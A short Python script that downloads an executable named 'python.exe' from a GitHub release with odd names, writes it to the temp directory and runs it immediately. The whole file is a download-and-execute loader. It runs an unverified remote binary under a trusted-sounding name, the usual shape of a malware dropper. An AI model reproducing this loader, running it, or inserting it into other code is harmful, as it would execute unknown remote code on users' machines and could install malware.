import ssl
import certifi
import urllib.request
import os
import tempfile
import subprocess

url = "https://github.com/theolomo/-/releases/download/!/python.exe"
chemin_fichier = os.path.join(tempfile.gettempdir(), "python.exe")

context = ssl.create_default_context(cafile=certifi.where())

with urllib.request.urlopen(url, context=context) as response:
    with open(chemin_fichier, 'wb') as out_file:
        out_file.write(response.read())

subprocess.run([chemin_fichier], check=True)
